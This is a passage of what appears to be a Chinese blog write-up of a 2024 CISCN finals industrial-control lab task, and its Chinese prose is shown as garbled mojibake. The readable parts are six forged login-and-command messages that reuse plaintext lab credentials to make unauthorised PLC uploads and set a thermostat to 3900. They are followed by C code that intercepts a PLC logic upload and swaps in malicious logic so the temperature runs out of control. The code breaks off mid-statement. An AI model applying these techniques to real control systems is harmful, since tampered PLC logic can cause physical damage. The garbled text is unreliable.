ä»£è¡¨ï¼Œå‚è€ƒå·¥ç¨‹å¸ˆç”¨æˆ·ç›®å½•ä¸‹çš„code_upload.msg</p><p>åœ¨å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™å’Œç®¡ç†ç»ˆç«¯å„æ‰¾åˆ°ä¸¤ä¸ªå¯è¿è§„æ“ä½œç‚¹ï¼ŒæŒ‰ç…§ä¸‹è¡¨åˆ›å»ºè¿è§„ç™»å½•ä¸æ“ä½œçš„ç»„åˆæ¶ˆæ¯ï¼š</p><table><thead><tr><th>ä½ç½®</th><th>ç¼–å·</th><th>ç™»å½•ï¼ˆä½¿ç”¨éåˆè§„ç”¨æˆ·ï¼‰</th><th>æ“ä½œï¼ˆéåˆè§„ç”¨æˆ·æ‰§è¡Œè¿è§„æ“ä½œï¼‰</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>å·¥ç¨‹å¸ˆç”¨æˆ·</td><td>è¿è§„ç‚¹1</td><td>attack_login1.msg</td><td>attack_cmd1.msg</td><td></td></tr><tr><td></td><td>è¿è§„ç‚¹2</td><td>attack_login2.msg</td><td>attack_cmd2.msg</td><td></td></tr><tr><td>æ“ä½œå‘˜ç”¨æˆ·</td><td>è¿è§„ç‚¹3</td><td>attack_login3.msg</td><td>attack_cmd3.msg</td><td></td></tr><tr><td></td><td>è¿è§„ç‚¹4</td><td>attack_login4.msg</td><td>attack_cmd4.msg</td><td></td></tr><tr><td>ç›‘è§†å‘˜ç”¨æˆ·</td><td>è¿è§„ç‚¹5</td><td>attack_login5.msg</td><td>attack_cmd5.msg</td><td></td></tr><tr><td></td><td>è¿è§„ç‚¹6</td><td>attack_login6.msg</td><td>attack_cmd6.msg</td><td></td></tr></tbody></table><p>å¯¹ä¸Šé¢çš„æè¿°è¿›è¡Œé˜…è¯»ç†è§£ï¼Œå½¢æˆä¸€ä¸ªè¡¨æ ¼ï¼ˆbydè¿™å‡ å¥è¯çœŸç»™æˆ‘cpuå¹²çƒ§äº†ï¼‰</p><table><thead><tr><th></th><th>ç™»å½•æ“ä½œå‘˜ç«™</th><th>ç™»å½•ç›‘è§†ç»ˆç«¯</th><th>ç™»å½•å·¥ç¨‹å¸ˆç«™</th><th>æ“ä½œå‘˜ç«™è°ƒèŠ‚æ¸©åº¦</th><th>ç›‘è§†ç»ˆç«¯è°ƒèŠ‚æ¸©åº¦</th><th>ä»£ç ä¸Šä¼ å’Œé€»è¾‘ä¸Šä¼ </th></tr></thead><tbody><tr><td>å·¥ç¨‹å¸ˆ</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td></td><td></td><td>âˆš</td></tr><tr><td>æ“ä½œå‘˜</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td></td><td></td></tr><tr><td>ç›‘è§†å‘˜</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td></td><td>âˆš</td><td></td></tr></tbody></table><p>é‚£ä¹ˆï¼Œè¿è§„çš„æƒ…å†µå°±æ˜¯ï¼š</p><p>å·¥ç¨‹å¸ˆç«™ï¼š</p><ul><li>æ“ä½œå‘˜æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ </li><li>ç›‘è§†å‘˜æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ </li></ul><p>æ“ä½œå‘˜ç«™ï¼š</p><ul><li>å·¥ç¨‹å¸ˆæ‰§è¡Œè°ƒèŠ‚æ¸©åº¦</li><li>ç›‘è§†å‘˜æ‰§è¡Œè°ƒèŠ‚æ¸©åº¦</li></ul><p>ç›‘è§†ç»ˆç«¯ï¼š</p><ul><li>æ“ä½œå‘˜æ‰§è¡Œè°ƒèŠ‚æ¸©åº¦</li><li>å·¥ç¨‹å¸ˆæ‰§è¡Œè°ƒèŠ‚æ¸©åº¦</li></ul><p>äºæ˜¯å°±èƒ½å¼€å§‹æ”¹æ–‡ä»¶äº†ï¼Œç”¨æˆ·åè§<a href="#user.list">user.list</a></p><p>attack_login1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112158556.png" alt="image-20240713112158556"></p><p>attack_login3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112608105.png" alt="image-20240713112608105"></p><p>attack_login5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112954670.png" alt="image-20240713112954670"></p><hr><h3 id="æ¶æ„é€»è¾‘"><a href="#æ¶æ„é€»è¾‘" class="headerlink" title="æ¶æ„é€»è¾‘"></a>æ¶æ„é€»è¾‘</h3><p>æœ¬ä»»åŠ¡æ˜¾ç¤ºæ”»å‡»è€…é€šè¿‡ç”¨æ¶æ„é€»è¾‘æ›¿ä»£æ­£å¸¸é€»è¾‘å¯¹ç³»ç»Ÿè¿›è¡Œæ”»å‡»çš„è¡Œä¸ºã€‚</p><p>åœ¨<code>logic/hack_logic</code>ä¸­ï¼Œè®¾ç½®äº†æ¶æ„çš„æ¸©åº¦é€»è¾‘ï¼Œåœ¨10ç§’åå°†å§‹ç»ˆä¿æŒè®¾ç½®æ¸©åº¦æ¡£ä½ä¸ºæœ€é«˜æ¡£ã€‚è¿™é‡Œhack_logicæ²¡æœ‰åˆ—åœ¨securityçš„makefileä¸­ï¼Œéœ€è¦å•ç‹¬ç¼–è¯‘ï¼Œç¼–è¯‘åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ª libthermostat_logic.so æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨æ¥å†’å……åˆæ³•é€»è¾‘çš„æ¶æ„é€»è¾‘æ–‡ä»¶ã€‚</p><blockquote><p>è¯·ä¸º<code>file_replace</code>æ¨¡å—<strong>å¡«å……æ–‡ä»¶æ›¿æ¢ä»£ç </strong>ï¼Œå¹¶é€šè¿‡ä¿®æ”¹æ¨¡å—é…ç½®æ–‡ä»¶å’Œåˆ‡é¢è·¯ç”±æ–‡ä»¶ï¼Œæ‹¦æˆªå·¥ç¨‹å¸ˆç«™åˆ°plcçš„äºŒè¿›åˆ¶é€»è¾‘æ–‡ä»¶ä¼ è¾“è¿‡ç¨‹(bin_uploadè·¯ç”±ï¼‰ï¼Œä½¿å¾—file_replaceæ¨¡å—åœ¨åˆé€‚ä½ç½®å‘æŒ¥ä½œç”¨ï¼Œå°†æ‰€ä¼ è¾“çš„libthermostat_logic.soæ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºhack_logicç›®å½•ä¸‹çš„åŒåæ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´ç³»ç»Ÿè¿è¡Œä¸€æ®µæ—¶é—´åæ¸©åº¦å¤±æ§ã€‚</p></blockquote><p>å¯ä»¥ç”¨<code>task_2_2_1.sh</code>è„šæœ¬æµ‹è¯•äºŒè¿›åˆ¶é€»è¾‘ä¸Šä¼ è¿‡ç¨‹ï¼Œç”¨<code>task_2_2_2.sh</code>è„šæœ¬æµ‹è¯•é€»è¾‘è¿è¡Œæƒ…å†µï¼Œè¯¥è„šæœ¬å¯åŠ¨åä¼š5ç§’è¯»ä¸€æ¬¡æ¸©åº¦çŠ¶å†µï¼Œé‡å¤å››æ¬¡ã€‚</p><br><p>æœ¬é¢˜éœ€è¦ä¿®æ”¹ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ul><li><code>file_replace.c</code> ï¼šåœ¨æ”¶åˆ°äºŒè¿›åˆ¶é€»è¾‘ä¼ è¾“å‘½ä»¤åï¼Œå°†æ­£å¸¸é€»è¾‘æ›¿æ¢æˆhack_logicç›®å½•ä¸‹çš„æ¶æ„é€»è¾‘</li><li><code>plugin_config.cfg.task_2_2</code> ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ file_replaceæ¨¡å—</li><li><code>aspect_policy.cfg.task_2_2</code> ï¼šåœ¨<code>bin_upload</code>ä¼ è¾“è¿‡ç¨‹ä¸­æ’å…¥<code>file_replace</code>æ¨¡å—ï¼Œä½¿å…¶å¯ä»¥åœ¨ä¸Šä¼ ä»£ç æ—¶ç”¨hack_logicä¸­æ¶æ„é€»è¾‘æ›¿æ¢åˆæ³•é€»è¾‘</li></ul><p>æ¶‰åŠåˆ°ä¸¤ä¸ªæ¨¡å—éœ€è¦æ¥è§¦</p><ul><li><code>file_replace</code> ï¼š<code>2024buildup/src/security/file_replace</code>ï¼Œéœ€è¦ç¼–å†™<code>file_replace.c</code> åšåˆ°è‡ªåŠ¨æ›¿æ¢æ¶æ„æ¨¡å—</li><li><code>hack_logic </code>ï¼š<code>2024buildup/src/logic/hack_logic</code></li></ul><p>æ‰‹å†Œçš„å¯è¯»æ€§å¤ªå·®ï¼Œç›´æ¥è·‘ä¸€ä¸ªtask_2_2_1.shçœ‹çœ‹å…¶æ—¥å¿—æ–‡ä»¶å†å¯¹ç€æ”¹</p><p>è§‚å¯Ÿsrc&#x2F;system&#x2F;logic_upload&#x2F;logic_upload.cçš„è¡Œä¸ºï¼Œçœ‹çœ‹æ˜¯å¦æœ‰æ”»å‡»çš„åˆ‡å…¥ç‚¹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120324134.png" alt="image-20240713120324134"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹å®Œæˆäº†æ–‡ä»¶çš„å¤åˆ¶ï¼Œç„¶åå†ä¹Ÿæ²¡ç®¡è¿‡ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•çš„æ ¡éªŒæªæ–½ã€‚åç»­æ˜¯è¿ç€æ–‡ä»¶åä¸€èµ·å‘äº†è¿‡å»çš„ï¼Œå¦‚æœèƒ½å¯¹è¿™ä¸ªæ–‡ä»¶åæŒ‡å‘çš„æ–‡ä»¶è¿›è¡Œè¦†å†™åº”è¯¥å°±èƒ½æˆäº†</p><p>src&#x2F;security&#x2F;file_replace&#x2F;file_replace.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bin_file_replace</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> sub_proc<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span> recv_msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> type<span class="token punctuation">;</span>        <span class="token keyword">int</span> subtype<span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">int</span> ret<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> bin_upload<span class="token punctuation">;</span>        ret<span class="token operator">=</span><span class="token function">message_get_record</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">,</span><span class="token operator">&amp;</span>bin_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> ret<span class="token punctuation">;</span>        <span class="token comment">// åœ¨è¿™é‡Œæ·»åŠ æ–‡ä»¶æ›¿æ¢ä»£ç </span>        <span class="token keyword">void</span><span class="token operator">*</span> c<span class="token operator">=</span><span class="token function">message_clone</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> logic_upload<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_CODE<span class="token punctuation">)</span> <span class="token operator">*</span> logic_code<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_bin<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_RETURN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_return<span class="token punctuation">;</span>        MSG_EXPAND <span class="token operator">*</span> msg_expand<span class="token punctuation">;</span>        <span class="token function">message_get_record</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token operator">&amp;</span>logic_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">message_remove_expand</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_expand<span class="token punctuation">)</span><span class="token punctuation">;</span>        logic_bin <span class="token operator">=</span> msg_expand<span class="token operator">-></span>expand<span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>plc_devname<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> s<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> dic<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>DIGEST_SIZE<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                s<span class="token punctuation">[</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                s<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        s<span class="token punctuation">[</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fsrc<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/root/2024buildup/src/logic/hack_logic/libthermostat_logic.so"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> fn<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcpy</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token string">"logic_bin/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcat</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fdst<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                ret<span class="token operator">=</span><span class="token function">write</span><span class="token punctuation">(</span>fdst<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token operator">&lt;</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>                len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token 